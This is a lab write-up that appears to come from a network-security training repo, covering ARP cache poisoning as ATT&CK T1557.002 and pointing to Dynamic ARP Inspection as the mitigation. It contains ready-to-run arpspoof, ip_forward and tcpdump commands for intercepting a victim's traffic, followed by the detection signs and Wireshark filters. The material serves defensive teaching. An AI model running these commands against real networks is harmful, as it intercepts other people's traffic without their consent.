# Attack 1 — ARP spoofing / man-in-the-middle

**ATT&CK:** T1557.002 Adversary-in-the-Middle: ARP Cache Poisoning
**Mitigation:** [Dynamic ARP Inspection](../mitigations/01-dai.md)

## What it does

ARP maps an IP address to a MAC address, and it has no authentication. Any host can send an
unsolicited ARP reply ("gratuitous ARP") claiming to own any IP, and every host that hears it
updates its cache. Poison the victim's cache so the gateway's IP points at the attacker's MAC,
poison the gateway so the victim's IP points at the attacker, and every packet between them
now flows through the attacker — who forwards it on, so nothing looks broken.

That is a full man-in-the-middle at Layer 2, defeating any Layer 3 control, and the victim
sees a working connection the whole time.

## How to run it

On the attacker (Kali), enable forwarding first so the victim keeps working and does not
notice the redirect:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

# poison both directions
arpspoof -i eth0 -t 192.168.10.20 192.168.10.1    # tell victim: I am the gateway
arpspoof -i eth0 -t 192.168.10.1  192.168.10.20   # tell gateway: I am the victim
```

Now capture the victim's traffic on the attacker:

```bash
tcpdump -i eth0 -w arp-mitm.pcap host 192.168.10.20
```

## What you see when it works

On the victim, before and after:

```
victim> arp -a
  gateway (192.168.10.1) at 00:0c:29:aa:bb:01   [ real gateway MAC ]
  ... run the attack ...
victim> arp -a
  gateway (192.168.10.1) at 00:0c:29:ff:ee:66   [ attacker MAC - same as the attacker's own ]
```

The gateway's IP now resolves to the attacker's MAC. Any unencrypted traffic the victim sends
is readable in `arp-mitm.pcap`.

## The fingerprint it leaves

This is what a Tier 1 analyst or an IDS keys on:

- **A flood of gratuitous ARP replies** — ARP replies nobody requested. Normal ARP is
  request-then-reply; a stream of unsolicited replies is the tell.
- **One MAC claiming multiple IPs** — the attacker's MAC now answers for both the gateway and
  the victim. In the capture, filter `arp.opcode == 2` and watch one `arp.src.hw_mac` map to
  several `arp.src.proto_ipv4`.
- **A MAC/IP binding that changes** — the gateway's IP suddenly resolves to a new MAC, then
  back. Switches with DAI log exactly this.

Wireshark even flags it natively: **"duplicate use of \<IP\> detected"**.

See [`captures/README.md`](../captures/README.md) for the exact display filters.

## Why it works, in one line

ARP was designed for a trusted segment and never got authentication. The fix is not to fix
ARP — it is to make the switch validate ARP against a table of known-good bindings, which is
what DAI does.
